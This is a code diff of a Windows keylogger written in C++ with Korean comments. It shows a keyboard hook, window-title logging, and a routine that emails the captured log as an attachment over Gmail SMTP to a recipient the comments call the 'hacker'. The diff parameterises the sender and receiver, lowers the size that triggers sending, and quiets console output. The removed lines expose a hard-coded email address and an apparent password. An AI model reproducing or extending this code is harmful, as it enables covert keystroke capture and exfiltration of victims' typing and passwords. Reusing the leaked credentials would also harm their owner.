@@ -1,7 +1,7 @@
 ﻿// KeyLogger.cpp : 이 파일에는 'main' 함수가 포함됩니다. 거기서 프로그램 실행이 시작되고 종료됩니다.
 
 #define _CRT_SECURE_NO_WARNINGS
-#define MAX_FILE_SIZE 20000
+#define MAX_FILE_SIZE 200
 #include "stdafx.h"
 #include "filemanager.h"
 #include "winmanager.h"
@@ -13,24 +13,25 @@ FILE* f;
 HHOOK hKeyboardHook;
 static int keysPressed = 0;
 
-void sendmail() {	// send logfile to hacker
+void sendmail(char* senderId, char* senderPw, char* receiverId) {	// send logfile to hacker
 	CkMailMan mailman;
 
 	mailman.put_SmtpHost("smtp.gmail.com");
-	mailman.put_SmtpUsername("didlaak6000@gmail.com");
-	mailman.put_SmtpPassword("alvrbqh95");
+	mailman.put_SmtpUsername(senderId);
+	mailman.put_SmtpPassword(senderPw);                                                                                                                                                                                                                                                                                                                                                   
 
 	mailman.put_SmtpSsl(true);
 	mailman.put_SmtpPort(465);
 
 	CkEmail email;
+	const char* content = email.addFileAttachment(getlogfilepath(getlogfilename()));
 	email.put_Subject("Hooked result has been successfully arrived!!");
 	email.put_Body("Well Done! Happy Hacking :)");
 	email.put_From("HackerX");
 
-	bool success = email.AddTo(NULL, "didlaak6000@naver.com");
+	bool success = email.AddTo(NULL, receiverId);
 
-	const char* content = email.addFileAttachment(getlogfilepath(getlogfilename()));
+	
 	if (email.get_LastMethodSuccess() != true) {
 		cout << email.lastErrorText() << "\r\n";
 	}
@@ -46,7 +47,7 @@ void sendmail() {	// send logfile to hacker
 		cout << "Connection to SMTP server not closed cleanly." << "\r\n";
 	}
 
-	cout << "Mail with attachments sent!" << "\r\n";
+	cout << "Mail with attachments sent!" << "\r\n";                
 }
 
 DWORD WINAPI Keylogger(LPVOID lpParm) {		// keylogger loop
@@ -113,13 +114,13 @@ void wintitle() {		//  logging the currently running windows
     }
 }
 
-void FSD() {		// File size detetor
+void FSD(char* senderId, char* senderPw, char* receiverId) {		// File size detetor
     while (TRUE) {
         Sleep(1000);
         if (getfilesize() > MAX_FILE_SIZE) {
-            printf("File size over!\n");
+            // printf("File size over!\n");
 			// sends logfile to email
-			sendmail();
+			sendmail(senderId, senderPw, receiverId);
         }
     }
 }
